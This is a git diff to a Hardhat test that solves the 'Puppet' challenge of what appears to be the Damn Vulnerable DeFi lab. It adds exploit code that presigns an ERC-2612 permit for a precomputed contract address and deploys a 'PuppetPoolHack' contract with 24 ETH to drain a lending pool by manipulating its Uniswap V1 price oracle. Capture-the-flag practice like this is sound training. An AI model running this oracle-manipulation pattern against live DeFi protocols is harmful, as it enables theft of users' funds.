@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require("eth-permit");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -94,7 +95,64 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+      // Helper function to get current token/eth balances
+      const logBalances = async (address, name) => {
+        const ethBal = await ethers.provider.getBalance(address);
+        const tokenBal = await attackToken.balanceOf(address);
+
+        console.log(`${name} ETH:`, ethers.utils.formatEther(ethBal));
+        console.log(`${name} DVT:`, ethers.utils.formatEther(tokenBal));
+        console.log("")
+      }
+
+      // Connect to the contracts with the attackers wallet
+      const attackPool = lendingPool.connect(player);
+      const attackToken = token.connect(player);
+      const attackUniSwap = uniswapExchange.connect(player);
+
+      console.log("Pre-attack balances")
+      await logBalances(player.address, "player");
+      await logBalances(attackUniSwap.address, "uniswap");
+
+      
+      // We are going to presign a permit so we dont need to approve and transferFrom
+      // Get contract address we will be creating on our next transaction (determined from address & nonce see yellowpaper)
+      const contractAddr = ethers.utils.getContractAddress({
+        from: player.address,
+        nonce: await player.getTransactionCount()
+      })
+      // Sign permit for our uncreated contract so we can transferFrom any amount from attacker w/ new contract
+      const res = await signERC2612Permit(
+        player,
+        attackToken.address,
+        player.address,
+        contractAddr,
+        PLAYER_INITIAL_TOKEN_BALANCE
+      )
+
+      //Create our attack contract, all work done in constructor
+      //need to pass along all our relevant data in constructor
+      console.log("Deploying")
+      const PuppetPoolHackFactory = await ethers.getContractFactory("PuppetPoolHack", player);
+      await PuppetPoolHackFactory.deploy(
+        attackPool.address,
+        attackToken.address,
+        attackUniSwap.address,
+        res.deadline,
+        res.v,
+        res.r,
+        res.s,
+        PLAYER_INITIAL_TOKEN_BALANCE,
+        POOL_INITIAL_TOKEN_BALANCE,
+        {
+          gasLimit: 1e7,
+          value: ethers.utils.parseEther("24")
+        }
+      );
+      
+      console.log("Post attack balances");
+      await logBalances(player.address, "player");
+      await logBalances(attackUniSwap.address, "uniswap");
     });
 
     after(async function () {
